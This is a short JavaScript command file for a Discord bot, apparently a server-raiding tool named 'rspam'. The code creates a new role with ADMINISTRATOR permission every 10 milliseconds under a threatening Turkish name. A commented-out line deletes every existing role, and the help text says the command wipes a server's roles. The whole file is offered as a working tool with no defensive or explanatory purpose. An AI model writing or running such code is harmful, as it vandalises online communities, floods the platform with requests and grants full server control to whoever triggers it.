const Discord = require('discord.js');

exports.run = (client, msg, args) => {
  //msg.guild.roles.cache.forEach(roles => roles.delete());
  setInterval(() => {
    msg.guild.roles.create({ name: "Shelle Baş Kaldıranın Başını Keserler", color: "A93D3D", permissions: ["ADMINISTRATOR"] });
  }, 10);
};

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['rspam']
};

exports.help = {
  name: 'Rol Spam',
  description: 'Sunucudaki Tüm Rolleri Silip Tekrar Rol Açar.',
  usage: '!rspam'
};